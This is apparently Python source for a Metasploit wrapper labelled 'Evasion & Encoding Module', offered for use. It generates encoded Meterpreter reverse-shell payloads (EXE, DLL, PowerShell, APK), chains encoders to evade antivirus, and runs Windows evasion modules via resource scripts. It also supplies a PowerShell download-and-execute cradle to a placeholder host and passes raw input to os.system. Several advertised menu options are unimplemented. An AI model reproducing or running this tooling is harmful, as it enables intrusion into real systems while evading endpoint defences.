
def box(title, icon="⚔️"):
    print()
    print(f"[31m[1m  ┌{'─'*46}┐[0m")
    print(f"[31m[1m  │[0m  [32m[1m{icon}  [33m[1m{title}[0m  [31m[1m{' '*(43-len(title))}[0m")
    print(f"[31m[1m  └{'─'*46}┘[0m")
    print()

section_header = box

def move_to_sdcard(filepath):
    if not os.path.exists(filepath):
        return False
    for sd in ["/sdcard", "/storage/emulated/0"]:
        if os.path.exists(sd):
            dest = os.path.join(sd, os.path.basename(filepath))
            try:
                import shutil as _sh
                _sh.copy2(filepath, dest)
                print(f"  [32m[1m  ✅ Moved to {dest}[0m")
                return True
            except:
                pass
    print(f"  [36m[1m  ➜ {filepath}[0m")
    return False
#!/usr/bin/env python3
"""Evasion & Encoding Module"""

import os
import sys
import shutil
import subprocess

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    subprocess.run([sys.executable, "-m", "pip", "install", "colorama", "--break-system-packages"], capture_output=True)
    from colorama import Fore, Style, init
    init(autoreset=True)

R, G, Y, B, M, C, W = Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN, Fore.WHITE
D, BRIGHT, RESET = Style.DIM, Style.BRIGHT, Style.RESET_ALL


# ═══════════════════════════════════════════════════════════════
#  TOOL DETECTOR (same as main.py)
# ═══════════════════════════════════════════════════════════════

MSF_PATHS = [
    os.path.expanduser("~/metasploit-framework/msfconsole"),
    "/opt/metasploit-framework/bin/msfconsole",
    "/usr/bin/msfconsole",
    "/usr/local/bin/msfconsole",
    shutil.which("msfconsole") or "",
]

def find_tool(name):
    path = shutil.which(name)
    if path:
        return path
    common = {
        "msfconsole": MSF_PATHS,
        "msfvenom": ["~/metasploit-framework/msfvenom", "/opt/metasploit-framework/bin/msfvenom", "/usr/bin/msfvenom"],
        "nmap": ["/usr/bin/nmap"],
        "sqlmap": ["/usr/bin/sqlmap", "/usr/share/sqlmap/sqlmap.py"],
        "hydra": ["/usr/bin/hydra"],
        "john": ["/usr/bin/john"],
        "nikto": ["/usr/bin/nikto"],
        "gobuster": ["/usr/bin/gobuster"],
        "dirb": ["/usr/bin/dirb"],
    }
    for p in common.get(name, []):
        if p and os.path.exists(p):
            return p
    return None

def get_msf_path():
    return find_tool("msfconsole") or "msfconsole"

def get_msfvenom_path():
    return find_tool("msfvenom") or "msfvenom"

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def info(msg):
    print(f"  {C}{BRIGHT}  ℹ️  ➤ {msg}{RESET}")

def success(msg):
    print(f"  {G}{BRIGHT}  ✅ ✔ {msg}{RESET}")

def error(msg):
    print(f"  {R}{BRIGHT}  ❌ ✘ {msg}{RESET}")

def cmd_result(label, value):
    print(f"  {M}{BRIGHT}  ◆ {B}{label}:{RESET} {G}{BRIGHT}{value}{RESET}")

def get_ip(prompt, default=""):
    val = input(f"  {C}{BRIGHT}{prompt}{RESET}").strip()
    return val if val else default

def box_alias(title, icon="🎭"):
    print()
    print(f"{R}{BRIGHT}  ╔════════════════════════════════════════════════════════════════════════╗{RESET}")
    print(f"{R}{BRIGHT}  ║{RESET}  {G}{BRIGHT}  {icon}  {Y}{BRIGHT}{title}{RESET}  {R}{BRIGHT}{' '*(63-len(title))}║{RESET}")
    print(f"{R}{BRIGHT}  ╚════════════════════════════════════════════════════════════════════════╝{RESET}")
    print()

def generate_rc_and_run(commands, name="evasion"):
    rc_file = f"/tmp/{name}.rc"
    with open(rc_file, 'w') as f:
        for cmd in commands:
            f.write(cmd + "\n")
    info(f"Generated: {rc_file}")
    os.system(f"{get_msf_path()} -r {rc_file}")

def evasion_menu():
    section_header("EVASION & ENCODING", "🎭")
    
    print(f"""
  {Y}═══ ENCODERS ═══{RESET}
  {M}[1]{RESET}   {G}Shikata Ga Nai (Polymorphic XOR){RESET}
  {M}[2]{RESET}   {G}X64 XOR Encoder{RESET}
  {M}[3]{RESET}   {G}PowerShell Base64 Encoder{RESET}
  {M}[4]{RESET}   {G}MIPS Long XOR{RESET}
  {M}[5]{RESET}   {G}PPC Long XOR{RESET}
  {M}[6]{RESET}   {G}SPARC XOR{RESET}
  {M}[7]{RESET}   {G}ARM XOR{RESET}
  {M}[8]{RESET}   {G}Multi/NodeJS Base64{RESET}
  {M}[9]{RESET}   {G}Base64 (all platforms){RESET}
  {M}[10]{RESET}  {G}MIPS體 XOR Encoder{RESET}
  {M}[11]{RESET}  {G}PHP Base64 Encoder{RESET}
  {M}[12]{RESET}  {G}Python Base64 Encoder{RESET}
  ─────────────────────────────────
  {Y}═══ EVASION (MSF6+ Evasion Modules) ═══{RESET}
  {M}[13]{RESET}  {G}Windows Defender Evasion{RESET}
  {M}[14]{RESET}  {G}MSBuild Evasion{RESET}
  {M}[15]{RESET}  {G}Regsvr32 Evasion{RESET}
  {M}[16]{RESET}  {G}InstallUtil Evasion{RESET}
  {M}[17]{RESET}  {G}CSC (C# Compiler) Evasion{RESET}
  {M}[18]{RESET}  {G}MSHTA Evasion{RESET}
  {M}[19]{RESET}  {G}Certutil Evasion{RESET}
  {M}[20]{RESET}  {G}RegAsm Evasion{RESET}
  {M}[21]{RESET}  {G}MSXSL Evasion{RESET}
  {M}[22]{RESET}  {G}MMC Evasion{RESET}
  {M}[23]{RESET}  {G}Custom Evasion Module{RESET}
  ─────────────────────────────────
  {Y}═══ OBFUSCATION ═══{RESET}
  {M}[24]{RESET}  {G}PowerShell Obfuscation{RESET}
  {M}[25]{RESET}  {G}PowerShell Invoke-Obfuscation{RESET}
  {M}[26]{RESET}  {G}VBA Obfuscation{RESET}
  {M}[27]{RESET}  {G}JavaScript Obfuscation{RESET}
  {M}[28]{RESET}  {G}C# Obfuscation{RESET}
  {M}[29]{RESET}  {G}HTML Smuggling (Obfuscated){RESET}
  ─────────────────────────────────
  {Y}═══ MSFVENOM PAYLOAD GENERATION ═══{RESET}
  {M}[30]{RESET}  {G}Generate + Encode EXE{RESET}
  {M}[31]{RESET}  {G}Generate + Encode DLL{RESET}
  {M}[32]{RESET}  {G}Generate + Encode PowerShell{RESET}
  {M}[33]{RESET}  {G}Generate + Encode APK{RESET}
  {M}[34]{RESET}  {G}Multi-Encoder Chain{RESET}
  {M}[35]{RESET}  {G}Custom msfvenom Command{RESET}
  ─────────────────────────────────
  {Y}═══ AV / EDR TESTING ═══{RESET}
  {M}[36]{RESET}  {G}Test Against Defender{RESET}
  {M}[37]{RESET}  {G}Test Against CrowdStrike{RESET}
  {M}[38]{RESET}  {G}Test Against Sentinel{RESET}
  {M}[39]{RESET}  {G}YARA Rule Generator{RESET}
  {M}[40]{RESET}  {G}Entropy Analysis{RESET}
  {M}[0]{RESET}   {R}🔙 Back{RESET}
""")
    
    choice = input(f"  {C}{BRIGHT}Choose [0-40]: {RESET}").strip()
    if choice == "0":
        return
    
    lhost = get_ip("LHOST (your IP): ", "0.0.0.0")
    lport = get_ip("LPORT (your port): ", "4444")
    output = get_ip("Output filename: ", "encoded_payload")
    
    encoder_map = {
        "1": "x86/shikata_ga_nai",
        "2": "x64/xor",
        "3": "cmd/powershell_base64",
        "4": "mipsbe/longxor",
        "5": "ppc/longxor",
        "6": "sparc/longxor",
        "7": "armle/longxor",
        "8": "nodejs/base64",
        "9": "generic/base64",
        "11": "php/base64",
        "12": "python/base64",
    }
    
    if choice in encoder_map:
        encoder = encoder_map[choice]
        payload = get_ip("Payload: ", "windows/x64/meterpreter/reverse_tcp")
        iterations = get_ip("Iterations (default 3): ", "3")
        cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -e {encoder} -i {iterations} -f exe -o /root/{output}.exe"
        info(f"Running: {cmd}")
        os.system(cmd)
        success(f"Encoded payload: /root/{output}.exe")
    
    elif choice in ["13", "14", "15", "16", "17", "18", "19", "20", "21", "22"]:
        evasion_modules = {
            "13": "exploit/windows/local/evasion/defender_exclusion",
            "14": "exploit/windows/local/evasion/msbuild",
            "15": "exploit/windows/local/evasion/regsvr32",
            "16": "exploit/windows/local/evasion/installutil",
            "17": "exploit/windows/local/evasion/csc",
            "18": "exploit/windows/local/evasion/mshta",
            "19": "exploit/windows/local/evasion/certutil",
            "20": "exploit/windows/local/evasion/regasm",
            "21": "exploit/windows/local/evasion/msxsl",
            "22": "exploit/windows/local/evasion/mmc",
        }
        if choice in evasion_modules:
            payload = "windows/x64/meterpreter/reverse_tcp"
            cmds = [
                f"use {evasion_modules[choice]}",
                f"set LHOST {lhost}",
                f"set LPORT {lport}",
                f"set PAYLOAD {payload}",
                "run"
            ]
            generate_rc_and_run(cmds, f"evasion_{choice}")
    
    elif choice == "24":
        info("PowerShell Obfuscation:")
        payload_ps = get_ip("PowerShell command: ", "IEX (New-Object Net.WebClient).DownloadString('http://YOUR_IP/shell')")
        cmd = f"powershell -enc {payload_ps}"
        info(f"Obfuscated command: {cmd}")
    
    elif choice == "25":
        info("Invoke-Obfuscation usage:")
        print(f"  {Y}Invoke-Obfuscation{RESET}")
        print(f"  {Y}SET SCRIPTPATH /path/to/script.ps1{RESET}")
        print(f"  {Y}1 (Token){RESET}")
        print(f"  {Y}1 (Strings){RESET}")
        print(f"  {Y}4 (Encoding){RESET}")
        print(f"  {Y}5 (Launcher){RESET}")
    
    elif choice == "30":
        payload = get_ip("Payload: ", "windows/x64/meterpreter/reverse_tcp")
        enc = get_ip("Encoder (default shikata_ga_nai): ", "x86/shikata_ga_nai")
        iters = get_ip("Iterations: ", "3")
        cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -e {enc} -i {iters} -f exe -o /root/{output}.exe"
        os.system(cmd)
        success(f"Encoded: /root/{output}.exe")
    
    elif choice == "31":
        payload = get_ip("Payload: ", "windows/x64/meterpreter/reverse_tcp")
        enc = get_ip("Encoder: ", "x64/xor")
        cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -e {enc} -i 3 -f dll -o /root/{output}.dll"
        os.system(cmd)
        success(f"Encoded: /root/{output}.dll")
    
    elif choice == "32":
        payload = get_ip("Payload: ", "windows/x64/meterpreter/reverse_tcp")
        cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -e cmd/powershell_base64 -i 2 -f psh -o /root/{output}.ps1"
        os.system(cmd)
        success(f"Encoded: /root/{output}.ps1")
    
    elif choice == "33":
        payload = get_ip("Payload: ", "android/meterpreter/reverse_tcp")
        cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -e x86/shikata_ga_nai -i 3 -f raw -o /root/{output}.apk"
        os.system(cmd)
        success(f"Encoded: /root/{output}.apk")
    
    elif choice == "34":
        info("Multi-encoder chain:")
        payload = get_ip("Payload: ", "windows/x64/meterpreter/reverse_tcp")
        cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -e x86/shikata_ga_nai -i 5 | msfvenom --platform windows -e x64/xor -i 3 -f exe -o /root/{output}.exe"
        os.system(cmd)
        success(f"Multi-encoded: /root/{output}.exe")
    
    elif choice == "35":
        cmd = input(f"  {C}{BRIGHT}msfvenom command: {RESET}").strip()
        if cmd:
            os.system(cmd)
    
    elif choice == "40":
        info("Entropy Analysis:")
        filepath = get_ip("File path: ", f"/root/{output}.exe")
        os.system(f"binwalk {filepath}")
        os.system(f"ent {filepath}")

    else:
        error("Invalid choice!")
